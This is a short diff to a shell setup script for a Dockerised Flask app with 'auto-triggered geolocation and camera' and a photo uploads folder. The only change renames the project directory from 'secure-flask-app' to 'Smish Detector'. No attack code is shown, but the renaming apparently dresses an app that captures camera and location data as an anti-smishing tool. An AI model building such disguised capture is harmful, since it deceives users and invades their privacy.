@@ -3,8 +3,8 @@ set -e
 
 echo "[+] Setting up secure Flask app with auto-triggered geolocation and camera..."
 
-mkdir -p secure-flask-app/{templates,static,uploads/photos,ssl}
-cd secure-flask-app
+mkdir -p "Smish Detector"/{templates,static,uploads/photos,ssl}
+cd "Smish Detector"
 
 echo "[+] Generating SSL certificate..."
 openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
@@ -206,5 +206,5 @@ services:
       - ./ssl:/app/ssl
 EOF
 
-echo "[✓] Setup complete in secure-flask-app/"
-echo "To run: cd secure-flask-app && docker-compose up --build"
+echo "[✓] Setup complete in 'Smish Detector'/"
+echo "To run: cd 'Smish Detector' && docker-compose up --build"
